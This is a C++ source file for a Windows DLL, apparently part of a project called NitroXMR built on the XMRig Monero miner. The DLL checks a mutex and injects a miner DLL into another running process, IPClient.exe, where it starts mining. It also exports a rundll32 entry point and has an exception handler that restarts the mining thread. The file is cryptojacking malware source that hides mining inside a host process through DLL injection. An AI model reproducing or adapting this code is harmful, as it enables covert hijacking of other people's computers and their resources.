/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "InjectProc.h"

#define DLLPATH L"G:\\Documents\\Visual Studio 2017\\Projects\\XMR\\NitroXMR\\Release\\mminer.dll"
/************************************************************************/

DWORD WINAPI MyMain(LPVOID lpParam);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);

HMODULE g_hDllModule; //定义Dll本身的句柄，方便自身函数回调
HANDLE g_hThread;

					  
/************************************************************************/


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	TCHAR PID[16];
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		wsprintf(PID, L"%d", GetCurrentProcessId());

		MessageBox(GetDesktopWindow(), L"proc attach", L"info", MB_OK);
		MessageBox(GetDesktopWindow(), PID, L"info", MB_OK);

		//保存Dll 自身的句柄
		g_hDllModule = (HMODULE)hModule;
		
		//CreateMutex(NULL, false, L"XmmR"); //该互斥体是只允许一台PC拥有一个实例)	
		if (NULL != OpenMutex(SYNCHRONIZE, false, L"XmmR"))
		{
			g_hThread = CreateThread(NULL, // default security attributes
				0, // use default stack size
				MyMain, // thread function
				NULL, // argument to thread function
				0, // use default creation flags	
				0); // returns the thread identifier
		}
		//printf("[+] Thread Created OK \n");
		break;
	

	case DLL_THREAD_ATTACH:
		wsprintf(PID, L"%d", GetCurrentProcessId());

		MessageBox(GetDesktopWindow(), L"thread attach", L"info", MB_OK);
		MessageBox(GetDesktopWindow(), PID, L"info", MB_OK);
		g_hDllModule = (HMODULE)hModule;

		//CreateMutex(NULL, false, L"XmmR"); //该互斥体是只允许一台PC拥有一个实例)	
		if (NULL != OpenMutex(SYNCHRONIZE, false, L"XmmR"))
		{
			g_hThread = CreateThread(NULL, // default security attributes
				0, // use default stack size
				MyMain, // thread function
				NULL, // argument to thread function
				0, // use default creation flags	
				0); // returns the thread identifier
		}
		break;
	
	case DLL_THREAD_DETACH:
		printf("\nthread detach of dll\n");
		break;
	
	case DLL_PROCESS_DETACH:
		printf("\nprocess detach of dll\n");

		break;
	}

	return TRUE;
}

//通过rundll32 运行 Cli : rundll32 miner.dll TestRun
extern "C" __declspec(dllexport) VOID TestRun()
{

	DWORD threadID;


		HANDLE hThread = CreateThread(NULL, // default security attributes
			0, // use default stack size
			MyMain, // thread function
			NULL, // argument to thread function
			0, // use default creation flags	
			&threadID); // returns the thread identifier



													//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}


//Dllmain 一定要开新线程 不能把它当做 main使用
DWORD WINAPI MyMain(LPVOID lpParam)
{

	HANDLE	hInstallMutex = NULL;
	HANDLE	hEvent = NULL;
	HANDLE hThread;

	TCHAR moudlePath[MAX_PATH];
	TCHAR errNO[16];

	// Set Window Station
	//--这里是同窗口交互
	HWINSTA hOldStation = GetProcessWindowStation();    //功能获取一个句柄,调用进程的当前窗口
	HWINSTA hWinSta = OpenWindowStation(L"winsta0", FALSE, MAXIMUM_ALLOWED);   //　打开指定的窗口站  XP的默认窗口站
	
	if (hWinSta != NULL)
	{
		SetProcessWindowStation(hWinSta);   //设置本进程窗口为winsta0  // 分配一个窗口站给调用进程，以便该进程能够访问窗口站里的对象，如桌面、剪贴板和全局原子
		printf("[+] Set Station OK\n");
	}
	else
	{
		printf("[-] Set Station Failed\n");
	}





	GetModuleFileName(NULL, moudlePath, MAX_PATH);	//取得当前文件的全路径
	MessageBox(GetDesktopWindow(), moudlePath, L"info", MB_OK);

	//wprintf(moudlePath);

	if (g_hDllModule != NULL)   //g_hInstance 该值要在Dll的入口进行赋值
	{
		//自己设置了一个访问违规的错误处理函数 如果发生了错误 操作系统就会调用bad_exception
		//SetUnhandledExceptionFilter(bad_exception);  //这里就是错误处理的回调函数了


		hInstallMutex = CreateMutex(NULL, false, L"XmmR"); //该互斥体是只允许一台PC拥有一个实例)	

		if (GetLastError() == ERROR_ALREADY_EXISTS) //互斥体存在 已经经注入了
		{
			MessageBox(GetDesktopWindow(), L"Mutx Exists!", L"info", MB_OK);

			hInstallMutex = CreateMutex(NULL, false, L"start miner"); //该互斥体是只允许一台PC拥有一个实例)
			ReleaseMutex(hInstallMutex);
			/*新建互斥体并且释放, 这样可以让前一 loader 退出*/


			App miner;
			MessageBox(GetDesktopWindow(), L"start!", L"info", MB_OK);

			return miner.exec();
			//printf("[-] Another Running");
		}
		else //不存在互斥体,第一次运行,进行注入
		{
			MessageBox(GetDesktopWindow(), L"Mutx NOT Exists!", L"info", MB_OK);

			if (!InjectDll(DLLPATH, GetProcID(L"IPClient.exe")))
			{
				wsprintf(errNO, L"%d", GetLastError());
				MessageBox(GetDesktopWindow(), L"inject Failed", L"info", MB_OK);
			}
			else
			{
				MessageBox(GetDesktopWindow(), L"inject Success", L"info", MB_OK);
			}
				
			//{
			//	TCHAR errNO[16];
			//	wsprintf(errNO, L"%d", GetLastError());
			//	
			//	MessageBox(GetDesktopWindow(), errNO, L"info", MB_OK);
			//	HINSTANCE hDllInstace = LoadLibrary(DLLPATH);
			//		
			//	//VOID(_stdcall *FuncLPRun)();
			//	
			//	DWORD (WINAPI *FuncLPRun)(LPVOID lpParam);

			//	(FARPROC&)FuncLPRun = GetProcAddress(hDllInstace, "TestRun");

			//	if (FuncLPRun)
			//		{
			//		HANDLE hThread = CreateThread(NULL, // default security attributes
			//				0, // use default stack size
			//				FuncLPRun, // thread function
			//				NULL, // argument to thread function
			//				0, // use default creation flags	
			//				0); // returns the thread identifier

			//		}

			//	wsprintf(errNO, L"%d", GetLastError());
			//	
			//	MessageBox(GetDesktopWindow(), errNO, L"info", MB_OK);

			//}
			
			//while (NULL == OpenMutex(SYNCHRONIZE, false, L"injected"))
			//{
			//	MessageBox(GetDesktopWindow(), L"cannot open mutex", L"info", MB_OK);

			//	Sleep(1000);
			//}
			ReleaseMutex(hInstallMutex);

			Sleep(10000);
		}
		

	}

	return 0;
}




// 发生异常，重新创建进程
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{

	DWORD threadID;

	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		MyMain, // thread function
		NULL, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier




					//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}